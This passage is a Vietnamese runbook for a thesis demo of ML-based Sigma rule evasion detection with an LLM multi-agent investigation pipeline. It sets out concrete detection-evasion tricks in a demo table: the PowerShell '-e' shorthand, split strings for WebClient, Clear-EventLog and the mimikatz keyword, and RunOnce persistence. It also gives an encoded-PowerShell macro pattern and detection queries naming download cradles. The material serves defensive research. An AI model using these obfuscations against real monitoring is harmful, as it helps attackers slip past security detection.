  --query-string 'winlog.event_data.ScriptBlockText:*RED_DEMO_PS* OR winlog.event_data.ScriptBlockText:*DownloadString* OR winlog.event_data.ScriptBlockText:*FromBase64String*'
```

Kiểm tra alert:

```bash
curl -s -u elastic:PASSWORD \
  "http://10.10.20.100:9200/red-alerts-powershell-demo/_search?size=10&sort=@timestamp:desc" \
  | jq '.hits.hits[]._source | {ts: ."@timestamp", score: ."red.detection_score", top_rule: ."red.top_rule", text: ."red.command_line"}'
```

### 6.3 Registry Event

Backfill Sysmon SetValue Event ID 13 bằng `config/registry_event.yaml`:

```bash
python3 scripts/detect_live.py \
  --config config/registry_event.yaml \
  --es-host "http://elastic:PASSWORD@10.10.20.100:9200" \
  --es-index "logs-winlog.*" \
  --out-index red-alerts-registry-demo \
  --event-id 13 \
  --threshold 0.5 \
  --method cosine \
  --timestamp-field event.ingested \
  --since "20m" \
  --until "now" \
  --max-iter 1 \
  --no-state \
  --batch-size 100 \
  --query-string 'winlog.event_data.TargetObject:*RED_Demo* OR winlog.event_data.TargetObject:*red_demo*'
```

Nếu muốn bắt thêm registry key create/delete, chạy lại với `--event-id 12`
hoặc `--event-id 14` tùy Sysmon config. Kịch bản registry chính dùng Event ID
13 vì hành vi trọng tâm là set value.

Kiểm tra alert:

```bash
curl -s -u elastic:PASSWORD \
  "http://10.10.20.100:9200/red-alerts-registry-demo/_search?size=10&sort=@timestamp:desc" \
  | jq '.hits.hits[]._source | {ts: ."@timestamp", score: ."red.detection_score", top_rule: ."red.top_rule", target: ."red.command_line"}'
```

Thông điệp chính: mỗi event type phải dùng đúng config và đúng field log. RED có
thể demo cùng một ý tưởng "rule evasion" trên process command line,
ScriptBlockText và registry target/value events.

## 7. AI Agent investigation

Sau khi `red-alerts` đã có alert PowerShell, chạy AI Agent một lần:

```bash
source ~/venvs/rule_evasion_env/bin/activate
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
source .env

python3 -m agent.daemon \
  --interval 5 \
  --score-threshold 0.5 \
  --max-iter 1 \
  --batch-limit 1 \
  --since "2026-05-15T08:05:40Z" \
  --query-string 'red.command_line:*powershell*' \
  --no-state
```

Chạy này gọi LLM thật và tốn token. Mức thường gặp trong demo:

```text
~60-120 giây
~30k-80k tokens
~$0.01-$0.03 nếu dùng DeepSeek
```

Kiểm tra investigation mới nhất:

```bash
curl -s -u elastic:PASSWORD \
  "http://10.10.20.100:9200/ai-investigations/_search?size=1&sort=timestamp:desc" \
  | jq '.hits.hits[0]._source | {id: .investigation_id, severity: .triage.severity, technique: .red_analyst.evasion_technique, title: .report.title_vi, cost: .estimated_cost_usd, tokens: .total_tokens}'
```

Nơi xem trên Kibana:

```text
Discover -> AI Investigations
```

Nếu chưa có data view:

```text
Name: AI Investigations
Index pattern: ai-investigations
Timestamp field: timestamp
```

Field nên pin trong Discover:

```text
timestamp
triage.severity
triage.confidence
red_analyst.evasion_technique
mitre.primary_technique
response.requires_human_approval
estimated_cost_usd
total_tokens
report.title_vi
report.summary_vi
```

## 8. Terminal monitor

Monitor dùng `.env` để đọc Elasticsearch credential.

```bash
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
./demo/monitor.sh 10
```

Màn hình hiển thị:

- Tổng số document trong `red-alerts` và `ai-investigations`.
- 5 RED alert mới nhất.
- 5 AI investigation mới nhất.

## 9. Checklist trình diễn

1. Mở Kibana `Security -> Rules`, filter `SIGMA -`, cho thấy baseline rules.
2. Chọn event type muốn demo: process creation, PowerShell ScriptBlock hoặc registry event.
3. Chạy `baseline` trên Windows, chờ Elastic Security alert.
4. Chạy `evasion`, giải thích vì sao exact-match baseline có thể bỏ sót biến thể.
5. Chạy RED backfill bằng `detect_live.py` với config tương ứng, mở `red-alerts`.
6. Chỉ ra `red.detection_score`, `red.top_rule`, `red.command_line`.
7. Chạy `agent.daemon --max-iter 1`, mở `ai-investigations`.
8. Kết luận bằng báo cáo tiếng Việt, MITRE mapping, evasion explanation và Sigma patch.

## 10. Troubleshooting

| Lỗi | Cách xử lý |
|---|---|
| `ModuleNotFoundError: numpy` hoặc `openai` | `source ~/venvs/rule_evasion_env/bin/activate` rồi `pip install -r requirements.txt` |
| `ES_PASSWORD is empty` khi chạy monitor | Điền `ES_PASSWORD` trong `.env` |
| Không thấy RED alert | Kiểm tra `--es-index`, `--timestamp-field`, khoảng `--since/--until`, và đúng Event ID: `1` process, `4104` PowerShell, `13` registry SetValue |
| Không thấy PowerShell ScriptBlock log | Bật Script Block Logging và kiểm tra channel `Microsoft-Windows-PowerShell/Operational` có Event ID `4104` |
| Không thấy registry log | Kiểm tra Sysmon config có collect registry set value Event ID `13` |
| Không thấy Security alert baseline | Detection Rules chạy theo lịch; chờ ít nhất một interval hoặc kiểm tra rule đã enable |
| AI Agent không chạy | Kiểm tra `DEEPSEEK_API_KEY`, `ES_HOST`, `ES_USER`, `ES_PASSWORD` trong `.env` |
| Query quá nhiễu | Thêm `--query-string 'winlog.event_data.CommandLine:*powershell* OR process.command_line:*powershell*'` |

---

## 11. APT Demo Scenario — Kịch bản trình diễn cho GVHD

Phần này tổng hợp kịch bản demo "Cuộc tấn công APT vào FinanceCorp" được rehearsal sẵn để trình bày trước hội đồng. Gồm 3 file:

| File | Mục đích |
|---|---|
| `demo/apt_demo_scenario.ps1` | Script PowerShell **lab-safe** mô phỏng kill-chain APT — chạy trên Windows VM |
| `demo/QA_PREP.md` | 16 câu hỏi GVHD có thể hỏi + câu trả lời chuẩn bị sẵn |
| `demo/SLIDES_OUTLINE.md` | Khung 15 slides + timing 25-30 phút |

### 11.0 Phạm vi demo — "Attacker chiếm máy thế nào?"

Đây là câu hỏi GVHD hay vặn. Trả lời thẳng:

**Demo này là post-exploitation perspective** — giả định attacker đã có shell access trên Windows VM rồi. Initial access (làm sao chiếm được máy) **out of scope** cho lab vì cần:
- Email server thật + Outlook profile thật → gửi phishing email
- User thật click vào file → trigger macro
- Network egress thật để C2

→ Không khả thi trong lab thesis.

**Tuy nhiên** — đây không phải hạn chế của RED pipeline, mà là hạn chế của môi trường demo. Trong **production thật**, RED + Sigma có thể detect các giai đoạn đầu của intrusion:

| Phase intrusion | Event log sinh ra | RED có detect được không? |
|---|---|---|
| **Initial Access** — macro spawn powershell từ Word/Outlook | Sysmon EID 1: `process.parent.name = "winword.exe"`, `process.name = "powershell.exe"` | ✅ — RED process_creation model match command line pattern |
| **Execution** — PowerShell encoded payload | PowerShell EID 4104: ScriptBlockText chứa base64 + IEX | ✅ — RED powershell model match (đây là phase mạnh nhất) |
| **Discovery** — net user, whoami | Sysmon EID 1: cmd hoặc PS chạy lệnh recon | ✅ — RED process_creation match |
| **Persistence** — Run key | Sysmon EID 13: registry SetValue | ✅ — RED registry_event model match |
| **Defense Evasion** — clear log | PowerShell EID 4104: Clear-EventLog | ✅ — RED powershell model match |

**Trong lab demo này**, ta SSH vào Windows VM rồi chạy script — parent process là `sshd.exe` thay vì `outlook.exe`. **Sigma rule dạng "parent=Office AND child=powershell" sẽ KHÔNG fire trong demo lab**. Nhưng:
- **Sigma rule dạng "command_line contains X"** VẪN fire bình thường (vì command line giống nhau trong lab và production)
- **RED ML** dùng command_line pattern là chính → đầy đủ chức năng trong lab

→ Demo của bạn **đủ defensible** với câu trả lời này.

### 11.0.1 Để mô phỏng "attacker chiếm máy" thực tế hơn

Nếu GVHD muốn xem initial access, có 3 cách thực hiện trong lab:

**Cách 1 — Macro thật trong Word/Excel**:
- Tạo file `Q1_Report.docm` có macro VBA chạy `Shell("powershell.exe -e <base64>", 0)`
- Mở file trên Windows VM → macro fire → Sysmon log `parent=winword.exe child=powershell.exe`
- Đầy đủ tính realistic

**Cách 2 — Process injection mô phỏng**:
- Dùng `WMI Win32_Process.Create` để spawn powershell với parent giả lập
- Phức tạp, dễ fail, không cần cho demo cơ bản

**Cách 3 — Honest framing trong slide** (khuyến nghị):
- Slide nói rõ "demo post-exploitation perspective"
- Liệt kê 5 phase intrusion + chỉ ra RED có cover được phase nào
- Trong khi defending: *"Cách 1 (macro thật) em chưa làm vì cần Office license và infrastructure email. Em đề xuất là future work."*

### 11.1 Cốt truyện

| Thành phần | Chi tiết |
|---|---|
| Nạn nhân | Alice — kế toán trưởng FinanceCorp Vietnam |
| Máy đích | `DESKTOP-2UQB61H` (Windows 11, lab VM) |
| Velociraptor client_id | `C.1b622eacffe8b75d` |
| Attacker | APT giả định (cảm hứng APT32) |
| Mục tiêu | Đánh cắp báo cáo Q1 + persistence để truy cập lâu dài |

### 11.2 Kill chain — 5 phase ánh xạ trực tiếp với Sigma rule

Script `apt_demo_scenario.ps1` có 4 mode (giống 3 script `*_scenarios.ps1` còn lại):

| Mode | Mục đích | Kỳ vọng |
|---|---|---|
| `benign` | Hành động admin bình thường (whoami, OneDrive, Get-LocalUser) | Sigma silent, RED silent → đối chứng FP |
| `baseline` | Pattern CHUẨN (canonical) như `-EncodedCommand`, `IEX (...)`, `HKCU\...\Run\...` | **Sigma fires** ✓ + RED fires |
| `evasion` | Variant né rule: `-e` shorthand, split keyword, RunOnce thay Run | Sigma **MISS** ❌, RED **CATCH** ✅ — điểm bán hàng |
| `chain` | Multi-phase realistic — pha trộn baseline + evasion theo kill-chain | Mix các trên — workflow APT thật |

**Bảng map 5 phase với Sigma rule cụ thể trong `data/sigma/rules/`** (bạn có thể click trong Kibana Security → Rules để xem):

| # | Phase | Event type | Sigma rule baseline catch | Evasion technique (Sigma miss) |
|---|---|---|---|---|
| 1 | **Execution** — PowerShell encoded | process_creation (Sysmon EID 1) + powershell (EID 4104) | `posh_ps_susp_invocation_specific.yml` (chứa `-EncodedCommand`) | `-e` shorthand flag (PowerShell auto-expand) |
| 2 | **Download Cradle** — IEX + WebClient | powershell (EID 4104) | `posh_ps_susp_download.yml` (`System.Net.WebClient` + `.DownloadString`) | Split string: `'Sys'+'tem.Net.WebCl'+'ient'` |
| 3 | **Persistence** — Run key | registry_event (Sysmon EID 13) | rule check `HKCU\...\Run\` | Dùng `RunOnce` thay `Run` |
| 4 | **Defense Evasion** — Clear log | powershell (EID 4104) | `posh_ps_susp_clear_eventlog.yml` (literal `Clear-EventLog`) | Split keyword: `'Clear'+'-Event'+'Log'` |
| 5 | **Credential Access** marker | powershell (EID 4104) | `posh_ps_potential_invoke_mimikatz.yml` (literal `sekurlsa::logonpasswords`) | Split: `'sek'+'urlsa'+'::log'+'onpasswords'` |

Tất cả 5 phase là **LAB-SAFE**: không tải payload thật, không touch lsass thật, "dropper" chỉ là copy `calc.exe`, "C2" chỉ là DNS NXDOMAIN.

### 11.2.1 MITRE ATT&CK mapping

| Phase | Tactic | Technique |
|---|---|---|
| 1 | TA0002 Execution | T1059.001 PowerShell + T1027 Obfuscated Files |
| 2 | TA0002 Execution + TA0011 C2 | T1105 Ingress Tool Transfer |
| 3 | TA0003 Persistence | T1547.001 Registry Run Keys / Startup Folder |
| 4 | TA0005 Defense Evasion | T1070.001 Clear Windows Event Logs |
| 5 | TA0006 Credential Access | T1003.001 LSASS Memory (marker only) |

### 11.3 Chạy demo (chuẩn bị + trigger)

**Trên máy lab (Ubuntu, agent server)**:
```bash
# Đảm bảo Velociraptor server đang chạy + client Windows connected
sudo systemctl status velociraptor_server --no-pager
sudo -u velociraptor /usr/local/bin/velociraptor --config /etc/velociraptor/server.config.yaml \
  query "SELECT client_id, last_seen_at FROM clients()"

# Push script lên Windows VM (1 lần — đảm bảo UTF-8 BOM cho PowerShell parse đúng tiếng Việt)
python3 -c "
import codecs
with open('demo/apt_demo_scenario.ps1', 'rb') as f: c = f.read()
if not c.startswith(codecs.BOM_UTF8):
    with open('/tmp/apt_bom.ps1', 'wb') as f: f.write(codecs.BOM_UTF8 + c)
    print('BOM added')
"
sshpass -p '<WIN_PASS>' scp /tmp/apt_bom.ps1 \
  luanthanh@10.10.20.50:/C:/Users/LuanThanh/apt_demo_scenario.ps1
```

**Trên Windows VM (RDP hoặc SSH)** — chọn 1 trong 4 mode:

```powershell
# Mode benign — hành động admin bình thường (đối chứng FP)
.\apt_demo_scenario.ps1 -Mode benign

# Mode baseline — pattern CHUẨN, Sigma rule cứng catch được (show baseline works)
.\apt_demo_scenario.ps1 -Mode baseline

# Mode evasion — variant né rule, Sigma MISS nhưng RED CATCH (điểm bán hàng) ⭐
.\apt_demo_scenario.ps1 -Mode evasion

# Mode chain — full kill-chain mix baseline + evasion (realistic APT)
.\apt_demo_scenario.ps1 -Mode chain -SleepSeconds 240

# Chỉ chạy 1 phase (vd Phase 2 = Download Cradle) để demo từng rule riêng
.\apt_demo_scenario.ps1 -Mode evasion -Phase 2
```

Output mỗi lần in:
```
RunId   : <random 8-hex>   ← dùng search trong Kibana
Marker  : RED_APT_DEMO_PHASE*_<RunId>
```

**Workflow demo gợi ý** (15-20 phút):

1. Chạy `-Mode benign` → mở Kibana red-alerts → **không có alert** (đối chứng)
2. Chạy `-Mode baseline` → mở Kibana Security/Rules → **Sigma fires** + red-alerts có score
3. Chạy `-Mode evasion` → Kibana Security Rules → **Sigma silent** ❌ nhưng red-alerts có score ✅ → wow moment
4. Chạy `-Mode chain` → mix 5 phase → agent daemon pickup → ai-investigations populated

**Trên máy lab — Trigger agent pipeline**:

*Option A — Inject test alert (nhanh, deterministic cho demo)*:
```bash
# Lấy PID + RunId từ output script Windows, tạo /tmp/demo_alert.json
# (Template: copy từ section 11.10 bên dưới)
cd ~/KLTN/KLTN/Rule_Evasion_Detection/rule_evasion_detection
source ~/venvs/rule_evasion_env/bin/activate
export VR_USE_REAL=1
export VR_API_CONFIG=~/velociraptor/api.config.yaml
export VR_QUERY_TIMEOUT=180

python3 -m agent.run --alert-file /tmp/demo_alert.json --save /tmp/inv_demo.json
```

*Option B — Daemon poll ES (real flow, ~30-60s delay)*:
```bash
python3 -m agent.daemon --interval 30 --score-threshold 0.5
```

### 11.4 Kết quả rehearsal (verified 2026-05-18, post-fix v2)

Bảng dưới ghi nhận kết quả chạy **thật** trên lab sau khi fix 3 bug critical (Triage hallucinate, mock contamination, VQL artifact sai). Dùng làm bằng chứng cho luận văn:

| Metric | Giá trị |
|---|---|
| Pipeline | 8 agents (Supervisor → Triage → **Forensic** → Hunt+RED+MITRE → Response → Report) |
| Tổng thời gian | **217 giây** (real Velociraptor) |
| Tổng tokens | 92,002 |
| Cost ước tính | **$0.028 USD** (~700 VND) |
| Triage severity | HIGH |
| Forensic verdict | **confirmed_malicious** |
| Forensic evidence grade | **high** |
| Forensic confidence | **0.92** |
| Forensic artifacts | **7** (1 process + 3 file + 3 registry) |
| Forensic IOCs (toàn thật) | 7 (3 file paths + 1 SHA256 + 3 registry keys) |
| Containment actions | 5 (toàn target thật, không bịa) |
| Block IP fake | **0** ✓ |

**Per-agent metadata** (rehearsal v2 post-fix):
```
supervisor    2s   ~1,000 tokens
triage       ~12s  ~5,000 tokens   (now ghi parent=sshd.exe đúng từ alert)
forensic    ~90s  ~10,000 tokens   ⭐ tìm thấy 3 file + 3 registry thật
hunt         ~15s  ~12,000 tokens
red_analyst  ~10s  ~5,000 tokens
mitre        ~12s  ~6,000 tokens
response     ~30s  ~28,000 tokens  (target toàn thật, no fake IP)
report       ~30s  ~9,000 tokens
```

So với baseline pre-fix (rehearsal #1):
- Forensic artifacts: 2 → **7** (+250%)
- Forensic confidence: 0.85 → **0.92**
- Triage hallucinate parent: **YES → NO** ✓
- Response block IP fake (1.2.3.4): **YES → NO** ✓
- Cost: $0.021 → $0.028 (+33% — trade-off cho anti-hallucination rules trong prompt)

### 11.5 Wow moment ⭐ — Forensic Agent verify evidence cứng

Kết quả rehearsal post-fix cho thấy Forensic Agent thu thập được **bằng chứng cứng** từ host:

**IOCs THẬT Forensic phát hiện được trên host** (qua Velociraptor):
```
File droppers:
  C:\Users\Public\xkj9_demo_052d4f9d.exe
  C:\Users\Public\xkj9_demo_2177c23e.exe
  C:\Users\Public\xkj9_demo_6e9c8180.exe

SHA256 (cả 3 file, vì đều là copy của calc.exe):
  58189cbd4e6dc0c7d8e66b6a6f75652fc9f4afc7ce0eba7d67d8c3feb0d5381f

Registry persistence (Run keys):
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\RED_APT_DEMO_PERSIST_052d4f9d
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\RED_APT_DEMO_PERSIST_2177c23e
  HKCU\Software\Microsoft\Windows\CurrentVersion\Run\RED_APT_DEMO_PERSIST_6e9c8180
```

Đây là **bằng chứng cứng** — process tree, file path, SHA256, registry key đều query trực tiếp từ host qua Velociraptor, KHÔNG phải LLM bịa.

**Sau khi fix Bug 1 (Triage hallucinate)**, Triage giờ ghi đúng:
> *"Parent process: sshd.exe (SSH remote execution — cần Forensic verify)"*

So với trước fix:
> ❌ *"Parent process: outlook.exe → phishing vector"* (BỊA — alert không có outlook.exe)

**Sau khi fix Bug 2 (Mock contamination)**, Triage prefix `[MOCK]` cho data giả lập:
> *"[MOCK] Process tree mock: outlook.exe → powershell.exe → curl.exe (KHÔNG phải thật, parent thật là sshd.exe)"*

→ Response Agent **không còn đề xuất block IP fake** `1.2.3.4`. Containment targets giờ toàn data thật từ alert:
- Host: `DESKTOP-2UQB61H` (alert)
- Process: `powershell.exe (PID 6860)` (alert)
- User: `luanthanh` (alert)
- Case management: `kibana_cases` (safe action)

### 11.6 Sigma patch grounded by evidence

Response Agent dùng evidence từ Forensic để sinh patch **chính xác kỹ thuật**:

**Trích `sigma_patch_explanation_vi`**:
> *"Rule gốc chỉ check '-EncodedCommand' và '-Encoded' exact string. Attacker dùng flag '-e' (shorthand parameter) — PowerShell tự động expand thành '-EncodedCommand' nhưng chuỗi literal không xuất hiện trong command line. Patch bổ sung: (1) tất cả shorthand prefix có space: '-e ', '-ec ', '-en ', ...; (2) shorthand dính liền base64 (không space, uppercase S): '-eS', '-ecS', ...; (3) regex fallback phát hiện pattern '-e' hoặc '-E' theo sau bởi base64 dài ≥40 ký tự."*

3 lớp patch — đảm bảo bắt được toàn bộ họ variants shorthand.

### 11.7 Báo cáo Vietnamese final

Report Agent generate ~160 dòng markdown tiếng Việt, đầy đủ structure cho SOC:
- Tóm tắt
- Mức nghiêm trọng + lý do
- Kill chain timeline
- Evidence (process tree + file + registry + network)
- MITRE ATT&CK mapping
- Sigma rule patch
- Containment actions (7 items, có `needs_approval`)
- Recommended next steps

File mẫu: `/tmp/inv_demo.json` (rehearsal) — extract bằng:
```bash
jq -r '.report.full_markdown_vi' /tmp/inv_demo.json > rehearsal_report.md
```

### 11.8 Cleanup sau demo

Script `apt_demo_scenario.ps1` đã có **auto-cleanup** sau `$SleepSeconds + 30` giây — tự xóa dropper + registry Run key. Nếu cần xóa thủ công:

```powershell
# Trên Windows VM
Remove-Item C:\Users\Public\xkj9_demo_*.exe -Force -ErrorAction SilentlyContinue
$runKey = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Get-Item $runKey | Select-Object -ExpandProperty Property |
  Where-Object { $_ -like "RED_APT_DEMO_PERSIST_*" } |
  ForEach-Object { Remove-ItemProperty -Path $runKey -Name $_ }
```

### 11.9 Backup plan nếu live demo fail

| Tình huống | Cách xử lý |
|---|---|
| ELK ingest > 2 phút | Inject alert qua `python3 -m agent.inject_test_alert --host DESKTOP-2UQB61H` |
| Velociraptor query timeout | `unset VR_USE_REAL` → mock mode, giải thích "production có SLA 30s" |
| Agent daemon crash | Show `/tmp/inv_demo.json` (file rehearsal) làm bằng chứng |
| Windows VM offline | Demo mock mode + show pre-recorded screencast 3 phút |
| DeepSeek API rate limit | Lưu `inv_demo.json` từ rehearsal trên USB, mở qua `jq` |

### 11.10 Template alert JSON cho Option A

Lưu thành `demo/apt_alert_template.json`, sửa `pid`, `command_line` (base64), `RunId` cho mỗi lần demo:

```json
{
  "@timestamp": "2026-05-18T06:05:02.000Z",
  "host": {"name": "DESKTOP-2UQB61H", "client_id": "C.1b622eacffe8b75d"},
  "user": {"name": "luanthanh"},
  "process": {
    "name": "powershell.exe",
    "pid": 5624,
    "command_line": "powershell.exe -NoProfile -ExecutionPolicy Bypass -e VwByAGkAdABlAC0ASABvAHMAdAAg...",
    "parent": {"name": "sshd.exe"}
  },
  "red": {
    "stage1_score": 0.91,
    "stage1_model": "ensemble_f1",
    "top_rules": [
      {"rule_id": "powershell_encoded_command", "cosine_score": 0.94},
      {"rule_id": "powershell_suspicious", "cosine_score": 0.81}
    ],
    "evasion_type": "shorthand_flag"
  },
  "source_event_id": "apt-demo-<RunId>"
}
```

### 11.11 Tham khảo

- **Q&A Bank**: `demo/QA_PREP.md` — 16 câu hỏi GVHD + trả lời chuẩn bị sẵn
- **Slides outline**: `demo/SLIDES_OUTLINE.md` — 15 slides cho buổi defense 25-30 phút
- **Forensic Agent design**: `agent/prompts/forensic.md` + `agent/agents/forensic.py`
- **Velociraptor setup**: `~/velociraptor/VELOCI_INSTALL_NOTES.md`

### 11.12 Anti-Hallucination Fixes (2026-05-18 v2)

Sau rehearsal lần 1, đã phát hiện 3 bug critical làm pipeline có thể bịa data. Đã fix và verify:

| Bug | File sửa | Kết quả verify |
|---|---|---|
| **#1**: Triage bịa parent process từ ví dụ prompt | `agent/prompts/triage.md` — thêm rule "PHẢI đọc từ alert.process.parent.name, KHÔNG đoán" | Triage giờ ghi đúng `sshd.exe` (alert thật) thay vì `outlook.exe` (ví dụ trong prompt) |
| **#2**: Mock data ô nhiễm downstream (Response block IP fake 1.2.3.4) | `agent/prompts/{triage,hunt,response}.md` — thêm rule prefix `[MOCK]` + cấm tạo block action từ mock IOC | Response Agent KHÔNG còn đề xuất `block_ip: 1.2.3.4` (verify `has_block_1234: 0`) |
| **#3**: Velociraptor query không tìm thấy file + registry persistence | `agent/vr_client.py` — đổi VQL từ `Windows.Registry.NTUser` (offline hive) sang `Windows.Sys.StartupItems` (live Run keys) + `Windows.Search.FileFinder` với glob đúng (`C:\Users\Public\*.exe`) | Forensic giờ trả về 7 artifacts thật (1 process + 3 file + 3 registry) với SHA256 + path đầy đủ |

**Rule anti-hallucination chính** (áp dụng cho mọi prompt):
```
1. Mọi fact (parent, command, host, user, IP) PHẢI đọc trực tiếp từ alert
2. Tool result có "_mock": true → prefix [MOCK], KHÔNG ghi như fact
3. Block action chỉ được tạo nếu IOC đến từ forensic.iocs_observed thật
4. Khi Forensic verdict = inconclusive → giảm severity, KHÔNG destructive actions
5. Report Agent: PRIORITIZE Forensic findings khi conflict với Triage
```

**Defensible thesis claim sau fix**:
- *"Pipeline 8-agent không chỉ verify alert mà còn CORRECT hallucination từ Triage Agent. Forensic Agent ground các quyết định downstream trên bằng chứng cứng từ Velociraptor — đã chứng minh qua rehearsal: 0 lần block IP fake, 100% IOC trong containment đến từ host thật."*
